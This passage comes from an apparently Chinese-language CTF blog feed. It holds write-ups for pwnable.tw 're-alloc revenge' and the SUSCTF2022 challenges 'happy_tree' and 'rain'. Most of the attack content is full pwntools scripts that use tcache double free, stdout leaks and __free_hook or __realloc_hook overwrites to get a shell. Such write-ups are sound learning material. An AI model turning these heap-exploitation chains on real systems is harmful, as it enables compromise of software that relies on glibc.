0x7f5834304ca0 (main_arena+96) ◂—</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># then: frequently add and free 0x80 into 0x20 and 0x60 to overwrite</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># debug() # check tcache should be 1 less, one has been malloced</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        realloc(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># debug() # check tcache has only two chunks, one points to next main_arena</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># to stdout</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x78</span>,p16(<span class="number">0x4760</span>)) <span class="comment"># reput into tcache</span></span><br><span class="line">    <span class="comment"># debug() # check ptr and stdout inside tcache</span></span><br><span class="line">    <span class="comment"># 0x80 [  1]: 0x55555555b3b0 —▸ 0x7ffff7fc4760 (_IO_2_1_stdout_) ◂— ...</span></span><br><span class="line">    <span class="comment"># now ptr0 is at 0x55555555b3b0, try to alloc it out</span></span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0x18</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># debug() # check ptr1 is free</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x78</span>,p16(<span class="number">0x4760</span>))</span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># debug() # check 1 is free and stdout is at 0x80, debug mode change here&#x27;s ptr</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">1</span>,<span class="number">0x78</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>) <span class="comment">#partical write stdout</span></span><br><span class="line">        libc_info = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="comment"># debug() # check stdout</span></span><br><span class="line">    <span class="comment"># libc_info = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line">    success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">    <span class="comment"># gdb.attach(io,&quot;brva 0x15FB&quot;)</span></span><br><span class="line">    <span class="comment"># free(0)</span></span><br><span class="line">    libc_base = libc_info - <span class="number">0x1e7570</span></span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line">    system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + libc_base</span><br><span class="line">    realloc_hook = libc.symbols[<span class="string">&#x27;__realloc_hook&#x27;</span>]+libc_base</span><br><span class="line">    success(<span class="string">&quot;realloc_hook: &quot;</span> + <span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">    success(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">    success(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">    og = [<span class="number">0x106ef8</span>,<span class="number">0xe2383</span>,<span class="number">0xe237f</span>,<span class="number">0xe21d4</span>,<span class="number">0xe21d1</span>,<span class="number">0xe21ce</span>]</span><br><span class="line">    one = og[<span class="number">0</span>]+libc_base</span><br><span class="line"></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x18</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>) <span class="comment"># get 0 writable</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x471</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x471</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>)+p64(realloc_hook)*<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># debug() #check free_hook at 0x50&#x27;s tcache</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment"># debug() # check free_hook at head of 0x50</span></span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># debug() # check 0 is freehook</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x48</span>,p64(one))</span><br><span class="line">    <span class="comment"># debug()# check realloc_hook is og</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># io.sendline(&#x27;cat /home/re-alloc_revenge/flag&#x27;)</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(result!=<span class="number">1</span>):</span><br><span class="line">        io = process(filename)</span><br><span class="line">        <span class="comment"># io = remote(&#x27;chall.pwnable.tw&#x27;, 10310)</span></span><br><span class="line">        result = exp(io)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要注意的一点是，在打stdout泄露之后，<strong>打stdout的指针就不能再使用了</strong>(realloc的任何操作都不行)因此看到在上图我们拿到libc之后，只用了一个指针完成余下的所有操作。这里也很有技巧性。</p><p>考虑这种情况，如果想要通过realloc的UAF-edit修改tcache中的bk，我们至少需要一个指针A来修改，修改之后**A不能变大(否则自身又被释放，导致fd消失或者tcache-double_free)，不能减小之后再释放(因为会保留当前指针free掉，那么fd还是会消失))**这就必须要求有第二个指针协助，A修改fd之后(A在bins中)<strong>先变小自己，再用B拿走A，free(A)（此时B会到变小后的bins中，不影响当前Bins）此时A可以写，那么就可以用A拿出来fd</strong>。</p><p>但是这里只能用一个指针，也是很精巧的用法：用地址覆盖到下一个可用的bins中的fd，从而避免了修改自己的fd。这里还好我最后构造到能这样写，不然真的又要推倒重来，十分复杂。可能就要放弃了。</p><p>关于realloc感觉能用的洞和需要了解的知识点在自己做了realloc和realloc-revenge之后就能够比较清楚了。我这道题前后大概花了要10小时，真的好复杂，差点崩溃了(也可能我做的麻烦)</p><p>以下是成功截图。</p><p><img src="/2022/03/02/pwnable-re-alloc-revenge/image-20220302234703924.png" alt="image-20220302234703924"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>记录一下pwnable的排名，希望继续加油！！已经注册一年多了。也差不多学pwn一年多左右，希望和看到的人能够共勉！</p><p><img src="/2022/03/02/pwnable-re-alloc-revenge/image-20220303000034444.png" alt="image-20220303000034444"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUSCTF2022-pwn</title>
      <link href="/2022/02/28/SUSCTF2022-pwn/"/>
      <url>/2022/02/28/SUSCTF2022-pwn/</url>
      
        <content type="html"><![CDATA[<p>有关SUSCTF2022的一些题目复现。复现的内容有参考队内队员脚本以及官方wp。题目和附件在文末，其中kernel两道题没有做。</p><span id="more"></span><h1 id="happy-tree"><a href="#happy-tree" class="headerlink" title="happy_tree"></a>happy_tree</h1><p>这个pwn很有意思，出了一个递归导致的错误，以前还没见过(我做的题目还是太少了…)可能还是可以通过调试看出来。参考的wp是队内的脚本，赛后复现的。</p><p>程序主要实现了一个二叉排序树，按照data大小插入对应node左侧或者右侧。数据结构如下所示。这里主要用递归可能比较难理解一点。如果DS学的好可能比较容易。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> index; <span class="comment">// 二叉树的序号，也是chunk的大小(没有padding的)</span></span><br><span class="line">    <span class="type">int</span> null; <span class="comment">//不知道是啥</span></span><br><span class="line">    <span class="type">char</span>* buf; <span class="comment">// 储存数据</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tree</span>* <span class="title">left</span>;</span> <span class="comment">// 左子树</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tree</span>* <span class="title">right</span>;</span> <span class="comment">//右子树</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个地方主要的漏洞是<strong>由于libc版本是2.27，在key位置不会写入数据，导致key位置的right指针在free后不会被清空。</strong>会导致如下的情况。</p><p><img src="/2022/02/28/SUSCTF2022-pwn/image-20220228115228815.png" alt="image-20220228115228815"></p><p>为什么right指向一个index为0的chunk可能不太好理解，是因为free之后，fd变成0，而fd位置也正好是index位置，因此就变成0。此时2依然有3的指针，那么free(0)就相当于free(3)第二次，导致double free。由于libc可以一开始泄露，因此后面的就很简单了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 脚本参考albanis师傅</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./happytree&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">sz, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;cmd&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;data: &quot;</span>, <span class="built_in">str</span>(sz))</span><br><span class="line">    io.sendafter(<span class="string">&quot;content: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">sz</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;cmd&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;data: &quot;</span>, <span class="built_in">str</span>(sz))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">sz</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;cmd&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;data: &quot;</span>, <span class="built_in">str</span>(sz))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;brva 0xFBE&quot;</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    insert(<span class="number">0x98</span>+i, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span class="number">0x98</span>+<span class="number">8</span>-i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    insert(<span class="number">0x99</span>+i, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># clear tcache</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">insert(<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x3ebd61</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">insert(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0xE17&quot;)</span></span><br><span class="line">insert(<span class="number">9</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">insert(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 8&#x27;s right ptr is still at 9</span></span><br><span class="line">dele(<span class="number">8</span>) <span class="comment"># 8&#x27;s right will be cat to 9&#x27;s left</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0xE17&quot;)</span></span><br><span class="line">insert(<span class="number">13</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line">dele(<span class="number">0</span>) <span class="comment"># the size has become 0(into tcache ,that&#x27;s why this is so strange), cause double-free</span></span><br><span class="line"></span><br><span class="line">insert(<span class="number">14</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">insert(<span class="number">15</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">insert(<span class="number">16</span>, p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])) <span class="comment"># hijack free_hook</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="rain"><a href="#rain" class="headerlink" title="rain"></a>rain</h1><p>一个实现打印字母雨的代码，很有意思。结构体有点小复杂，如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rain</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> height;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> width;</span><br><span class="line"> <span class="type">unsigned</span> __int8 front_colour;</span><br><span class="line"> <span class="type">unsigned</span> __int8 back_colour;</span><br><span class="line"> <span class="type">int</span> *null1;</span><br><span class="line"> <span class="type">int</span> *null2;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> rainfall;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> speed;</span><br><span class="line"> <span class="type">char</span> *func;</span><br><span class="line"> <span class="type">char</span> *table1;</span><br><span class="line"> <span class="type">char</span> *table2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们能控制的是table2。程序接受一个buf输入，能够修改雨的类型和table等。逆向起来也不复杂。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">form_buf</span>(<span class="params">height,width,front_colour,back_colour,rainfall,content=<span class="number">0</span></span>):</span><br><span class="line">    payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">    payload +=p32(height)</span><br><span class="line">    payload+=p32(width)</span><br><span class="line">    payload+=p16(front_colour)</span><br><span class="line">    payload+=p16(back_colour)</span><br><span class="line">    payload+=p32(rainfall)</span><br><span class="line">    payload = payload.ljust(<span class="number">18</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    <span class="keyword">if</span>(content==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = payload+content</span><br><span class="line">        <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>有一个比较明显的漏洞在于config的时候调用了realloc，其中size可控。和pwnable的realloc两道题目很相似。这里控制realloc的size是0就可以实现UAF。但是比较困难的地方在于realloc到一个较大的size时不会从tcache里面取值。这就要求构造fastbin attack。但是即使构造好了，我们的指针也只能指向fastbin的第一个块，<strong>这个时候不能进行任何操作，如果改小size，下一次分配的时候通不过fastbin的size检查，如果改大了，会释放原先在fastbin头部的块，造成fastbin top double free的错误。</strong>比赛的时候就是卡在这里，没有了思路。</p><p>赛后看wp，发现大多都调用了raining刷新结构体。我本来也有想到这个，但是每次一刷新bash就坏掉了，直接EOF，单步调试发现可能是秒数的地方被改掉了(因为用了打unsortedbin的方法泄露libc)看了别人的wp才知道还能用GOT表，当时忘掉了。。。应该是只能通过劫持rain结构体来做。</p><h2 id="step1-double-free"><a href="#step1-double-free" class="headerlink" title="step1 double free"></a>step1 double free</h2><p>double free还是很简单的，2.27(1.2)没有任何检查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf = form_buf(<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x64</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>) <span class="comment">#0x90</span></span><br><span class="line">config(buf)</span><br><span class="line">buf = form_buf(<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x64</span>) <span class="comment"># free buf</span></span><br><span class="line">config(buf)</span><br><span class="line">buf = form_buf(<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x64</span>) <span class="comment"># free buf</span></span><br><span class="line">config(buf) <span class="comment"># double free buf</span></span><br></pre></td></tr></table></figure><h2 id="step2-rain"><a href="#step2-rain" class="headerlink" title="step2 rain"></a>step2 rain</h2><p>要先rain之后，清空原来的指针，之后malloc，才能利用double_free劫持相应结构体。具体因为在init中，可以看到malloc到了一块可控的大小</p><p><img src="/2022/02/28/SUSCTF2022-pwn/image-20220303195448405.png" alt="image-20220303195448405"></p><p>之后我们只要控制下面的malloc不会把我们double free的申请出来就行。我们后面申请table的时候再申请一个，就相当于有第二份可控的指针用来修改rain结构体的数据。改其中数据为GOT表即可。</p><p>下图为源数据。看的方法是rain之后看0x50的bins中剩下的那个指针。</p><p><img src="/2022/02/28/SUSCTF2022-pwn/image-20220303195404300.png" alt="image-20220303195404300"></p><p>我们修改之后的我数据长这样。</p><p><img src="/2022/02/28/SUSCTF2022-pwn/image-20220303201310904.png" alt="image-20220303201310904"></p><p>看似成功了？<strong>不！因为此时table2就是这个结构体的起始地址，因此我们将打印出chr(0x50)而不是table中修改的libc！</strong></p><p>我到这里也很苦恼，不知道怎么做。因为没办法让table2清空。看了wp才发现。程序中这里很诡异。</p><p><img src="/2022/02/28/SUSCTF2022-pwn/image-20220303201441123.png" alt="image-20220303201441123"></p><p>这里判断是否打印我们的table时判断条件是table&amp;&amp;*table，感觉这个*table明显是多余的，这也是我们利用的方法。<strong>只需要realloc当前rain的table2并在开始字节写入一个p64(0)就能实现*table=0，从而打印table1内容！</strong></p><p><img src="/2022/02/28/SUSCTF2022-pwn/image-20220303201821651.png" alt="image-20220303201821651"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf2 = form_buf(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x64</span>,p64(<span class="number">0</span>))</span><br><span class="line">config(buf2) <span class="comment"># 可以思考一下此时rain的指针长成什么样子？</span></span><br></pre></td></tr></table></figure><h2 id="getlibc之后？"><a href="#getlibc之后？" class="headerlink" title="getlibc之后？"></a>getlibc之后？</h2><p>在之前一道realloc-revenge中分析过，如果单纯使用realloc完成tcache攻击，至少需要两个快，否则需要堆溢出或者破坏堆结构，但是只有一次的写入机会。这里getlibc之后依然使用劫持结构体的方法写入freehook。和上述方法几乎完全一样。不过需要注意几点。</p><ol><li>由于之前double free过rain chunk，因此fd位置被改成rain的height和width。如果再次malloc则会报错。因此我们需要这样修改一次rain。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf = form_buf(<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x64</span>,payload) <span class="comment"># important to write zero, because 0x48 chunk need NULL fd</span></span><br><span class="line">config(buf)</span><br></pre></td></tr></table></figure><ol start="2"><li>利用此方法使用tcache写入freehook时，需要注意free_hook地址写成free_hook-0x8（思考一下为什么？）因为我们还需要一个/bin/sh要在某个堆块头部，很容易想到可以放在table2头部，调用realloc(ptr,0)时触发free_hook。但是这样free_hook就会覆盖为/bin/sh。因此写入free_hook-0x8时，可以第一个地方写/bin/sh，第二个地方写system。思路还是基本一致的。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./rain&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">config</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;FRAME&gt; &#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b *0x400E17&quot;</span>)</span><br><span class="line">    show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">aaa</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(aaa,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">form_buf</span>(<span class="params">height,width,front_colour,back_colour,rainfall,content=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">    payload +=p32(height)</span><br><span class="line">    